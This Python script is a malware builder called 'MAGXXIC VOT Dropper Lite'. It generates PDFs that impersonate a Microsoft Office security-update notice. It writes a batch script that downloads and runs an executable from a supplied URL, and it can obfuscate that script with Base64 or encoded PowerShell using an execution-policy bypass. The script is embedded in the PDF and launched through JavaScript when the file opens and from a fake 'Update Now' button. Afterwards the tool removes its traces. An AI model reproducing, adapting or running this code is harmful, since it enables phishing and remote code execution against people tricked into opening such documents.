import os
import sys
import img2pdf
import base64
import random
import string
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from reportlab.lib.units import inch
import argparse
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.text import Text
from rich.theme import Theme
from rich.prompt import Prompt, Confirm
from rich.table import Table
from pypdf import PdfWriter, PdfReader
from pypdf.generic import DictionaryObject, NameObject, TextStringObject, ArrayObject, NumberObject

# Custom theme for MAGXXIC VOT
custom_theme = Theme({
    "info": "bold cyan",
    "warning": "bold yellow",
    "error": "bold red",
    "success": "bold green",
    "highlight": "bold magenta",
    "banner": "bold gold1"
})

console = Console(theme=custom_theme)

def print_banner():
    banner_text = r"""
  __  __   _    ____ _  __ _  __ ___ ____   __   _____ _____
 |  \/  | / \  / ___| \/ /| |/ /|_ _/ ___|  \ \ / / _ \_   _|
 | |\/| |/ _ \| |  _ \  / | ' /  | | |       \ V / | | || |
 | |  | / ___ | |_| |/  \ | . \  | | |___     | || |_| || |
 |_|  |/_/   \_\____/_/\_\|_|\_\|___\____|    |_| \___/ |_|
    """

    # Create a stylized banner with gradients-like effect using different colors
    colors = ["bright_red", "orange1", "bright_yellow", "bright_green", "bright_blue", "bright_magenta", "purple"]
    lines = [line for line in banner_text.strip("\n").split("\n") if line.strip()]
    styled_banner = Text()
    for i, line in enumerate(lines):
        color = colors[i % len(colors)]
        styled_banner.append(line + "\n", style=f"bold {color}")

    footer = Text.from_markup("\n[bold white]M A G X X I C   V O T   D R O P P E R   L I T E   v 1 . 2[/]\n[italic cyan]Advanced PDF Delivery System - Stealth Edition[/]", justify="center")
    styled_banner.append(footer)

    console.print(Panel(styled_banner, border_style="bold cyan", expand=False, padding=(1, 2), subtitle="[bold magenta]Created by MAGXXIC TEAM[/]"))

def obfuscate_bat(content, method):
    if method == "Base64":
        encoded = base64.b64encode(content.encode()).decode()
        return f'@echo off\nset "b64={encoded}"\npowershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:b64)) | iex"'

    elif method == "Variable Obfuscation":
        # Simple variable substitution
        var_name = "".join(random.choices(string.ascii_letters, k=8))
        return content.replace("curl", f"%{var_name}%").replace("@echo off", f"@echo off\nset {var_name}=curl")

    elif method == "PowerShell Encoded":
        ps_cmd = f"$c = '{content}'; iex $c"
        encoded_ps = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
        return f'@echo off\npowershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_ps}'

    return content

def create_pdf_dropper(payload_url, image_path, output_pdf, crypt_method):
    """
    Creates a PDF dropper that embeds the payload and attempts to execute it.
    """

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:

        # 1. Create the BAT file
        task1 = progress.add_task("Generating obfuscated payload script...", total=1)
        bat_file = "update_service.bat"

        raw_content = f'@echo off\n'
        raw_content += f'echo Initializing Security Update...\n'
        raw_content += f'curl -o "%TEMP%\\update.exe" "{payload_url}"\n'
        raw_content += f'start "" "%TEMP%\\update.exe"\n'
        raw_content += f'exit\n'

        final_content = obfuscate_bat(raw_content, crypt_method)

        try:
            with open(bat_file, "w") as f:
                f.write(final_content)
            progress.update(task1, completed=1)
        except Exception as e:
            console.print(f"[error]Failed to create BAT file: {e}[/]")
            return

        # 2. Build the base PDF using ReportLab
        task2 = progress.add_task("Designing PDF layout...", total=1)
        temp_pdf = "temp_base.pdf"

        # Coordinates for the button (needed for pypdf link later)
        btn_x = letter[0]/2 - 1.25*inch
        btn_y = letter[1] - 5*inch
        btn_w = 2.5*inch
        btn_h = 0.6*inch

        try:
            c = canvas.Canvas(temp_pdf, pagesize=letter)

            # Professional Header
            c.setFont('Helvetica-Bold', 22)
            c.setFillColorRGB(0.1, 0.2, 0.4)
            c.drawCentredString(letter[0]/2, letter[1] - 1.5*inch, "Microsoft Office Security Center")

            # Horizontal Line
            c.setLineWidth(2)
            c.line(inch, letter[1] - 1.7*inch, letter[0] - inch, letter[1] - 1.7*inch)

            c.setFont('Helvetica', 12)
            c.setFillColorRGB(0, 0, 0)
            text_lines = [
                "Your version of Microsoft Office is out of date and may be vulnerable.",
                "To ensure the security of your documents and data, a mandatory",
                "security patch must be applied immediately.",
                "",
                "Please click the 'Update Now' button below to start the automatic",
                "installation process. This process is secure and verified by Microsoft."
            ]
            y = letter[1] - 2.5*inch
            for line in text_lines:
                c.drawCentredString(letter[0]/2, y, line)
                y -= 0.3*inch

            # Modern Button Appearance
            c.setFillColorRGB(0.1, 0.4, 0.8) # Microsoft Blue
            c.roundRect(btn_x, btn_y, btn_w, btn_h, 0.1*inch, fill=1, stroke=0)

            c.setFillColorRGB(1, 1, 1)
            c.setFont('Helvetica-Bold', 14)
            c.drawCentredString(letter[0]/2, btn_y + 0.22*inch, "Update Now")

            # linkJS is not a method of ReportLab's Canvas.
            # We will add the JS link using pypdf in step 4.

            c.save()
            progress.update(task2, completed=1)
        except Exception as e:
            console.print(f"[error]Failed to generate base PDF: {e}[/]")
            return

        # 3. Handle Image
        temp_image = "temp_image.pdf"
        if image_path:
            task3 = progress.add_task("Injecting custom branding...", total=1)
            try:
                if os.path.exists(image_path):
                    with open(image_path, "rb") as f:
                        img_pdf_data = img2pdf.convert(f.read())
                    with open(temp_image, "wb") as f:
                        f.write(img_pdf_data)
                    progress.update(task3, completed=1)
                else:
                    console.print(f"[warning]Image path {image_path} not found. Skipping.[/]")
                    image_path = None
            except Exception as e:
                console.print(f"[warning]Image conversion failed: {e}. Skipping.[/]")
                image_path = None

        # 4. Embed file and add JS using pypdf
        task4 = progress.add_task("Crypting and Finalizing PDF...", total=1)
        try:
            writer = PdfWriter()

            # Add pages from base PDF
            if os.path.exists(temp_pdf):
                base_reader = PdfReader(temp_pdf)
                for page in base_reader.pages:
                    writer.add_page(page)

            # Add image page if exists
            if image_path and os.path.exists(temp_image):
                img_reader = PdfReader(temp_image)
                for page in img_reader.pages:
                    writer.add_page(page)

            # Embed the BAT file with a generic name
            with open(bat_file, "rb") as f:
                writer.add_attachment("Update.bat", f.read())

            # Stealthy JavaScript execution
            js_payload = """
            try {
                this.exportDataObject({ cName: "Update.bat", nLaunch: 2 });
            } catch (e) {}
            """
            writer.add_js(js_payload)

            # Add JS link on the button
            page = writer.pages[0]
            link_anno = DictionaryObject({
                NameObject("/Type"): NameObject("/Annot"),
                NameObject("/Subtype"): NameObject("/Link"),
                NameObject("/Rect"): ArrayObject([
                    NumberObject(btn_x),
                    NumberObject(btn_y),
                    NumberObject(btn_x + btn_w),
                    NumberObject(btn_y + btn_h)
                ]),
                NameObject("/A"): DictionaryObject({
                    NameObject("/S"): NameObject("/JavaScript"),
                    NameObject("/JS"): TextStringObject(js_payload)
                }),
                NameObject("/Border"): ArrayObject([NumberObject(0), NumberObject(0), NumberObject(0)])
            })

            if "/Annots" not in page:
                page[NameObject("/Annots")] = ArrayObject()

            # Use internal access to add annotation if add_annotation is not available/working as expected
            try:
                page.add_annotation(link_anno)
            except:
                page[NameObject("/Annots")].append(link_anno)

            with open(output_pdf, "wb") as f:
                writer.write(f)

            progress.update(task4, completed=1)
        except Exception as e:
            console.print(f"[error]Failed to finalize PDF: {e}[/]")
            return

        # 5. Cleanup
        finally:
            task5 = progress.add_task("Securely removing traces...", total=1)
            for f_path in [bat_file, temp_pdf, temp_image]:
                if os.path.exists(f_path):
                    try:
                        os.remove(f_path)
                    except:
                        pass
            progress.update(task5, completed=1)

    console.print(Panel(f"[success]SUCCESS![/]\n\nOutput File: [highlight]{output_pdf}[/]\nEncryption: [highlight]{crypt_method}[/]\nPayload Status: [highlight]Embedded & Crypted[/]", border_style="success"))

def main():
    print_banner()

    parser = argparse.ArgumentParser(description="MAGXXIC VOT PDF Dropper Generator")
    parser.add_argument("--payload_url", help="URL of the payload to download.")
    parser.add_argument("--image_path", help="Path to the image to embed (optional).")
    parser.add_argument("--output_pdf", help="Output PDF file name.")
    parser.add_argument("--crypt", choices=["None", "Base64", "Variable Obfuscation", "PowerShell Encoded"], help="Crypting method.")

    args = parser.parse_args()

    # Interactive Session if arguments are missing
    payload_url = args.payload_url
    if not payload_url:
        payload_url = Prompt.ask("[info]Enter Payload URL[/]", default="http://yourserver.com/payload.exe")

    image_path = args.image_path
    if not image_path:
        if Confirm.ask("[info]Embed custom image/branding?[/]", default=False):
            image_path = Prompt.ask("[info]Enter Image Path[/]")

    output_pdf = args.output_pdf
    if not output_pdf:
        output_pdf = Prompt.ask("[info]Enter Output Filename[/]", default="SecureDocument.pdf")
        if not output_pdf.endswith(".pdf"):
            output_pdf += ".pdf"

    crypt_method = args.crypt
    if not crypt_method:
        table = Table(title="Available Crypting Methods", border_style="highlight")
        table.add_column("ID", justify="center", style="cyan")
        table.add_column("Method", style="magenta")
        table.add_column("Stealth Level", justify="right")

        table.add_row("1", "None", "Low")
        table.add_row("2", "Base64 Obfuscation", "Medium")
        table.add_row("3", "Variable Obfuscation", "Medium")
        table.add_row("4", "PowerShell Encoded Wrapper", "High")

        console.print(table)
        choice = Prompt.ask("[info]Select Crypting Method[/]", choices=["1", "2", "3", "4"], default="4")

        mapping = {"1": "None", "2": "Base64", "3": "Variable Obfuscation", "4": "PowerShell Encoded"}
        crypt_method = mapping[choice]

    console.print(f"\n[info]Ready to generate [highlight]{output_pdf}[/] with [highlight]{crypt_method}[/] encryption.[/]")

    if Confirm.ask("[success][bold]START GENERATION?[/][/]", default=True):
        try:
            create_pdf_dropper(payload_url, image_path, output_pdf, crypt_method)
        except KeyboardInterrupt:
            console.print("\n[warning]Operation cancelled by user.[/]")
            sys.exit(0)
        except Exception as e:
            console.print(f"[error]An unexpected error occurred: {e}[/]")
            sys.exit(1)
    else:
        console.print("[warning]Aborted.[/]")

if __name__ == "__main__":
    main()
